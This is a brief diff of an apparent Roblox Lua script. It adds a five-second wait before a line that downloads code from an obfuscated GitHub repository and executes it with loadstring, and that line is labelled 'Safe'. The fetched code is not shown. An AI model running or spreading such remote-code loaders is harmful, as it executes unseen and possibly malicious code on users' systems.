@@ -9,4 +9,5 @@ wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/htsrshtroipndsoijdshtjoihdtsff0hoihjsi/main/fjfszfjtsjdtzsj", true))()
 
 --Safe
+wait(5)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/hrehetrhjsftjhfj/main/hdjtsrfjtsfjxgsxfjskxfjskfjkfjfjg", true))()
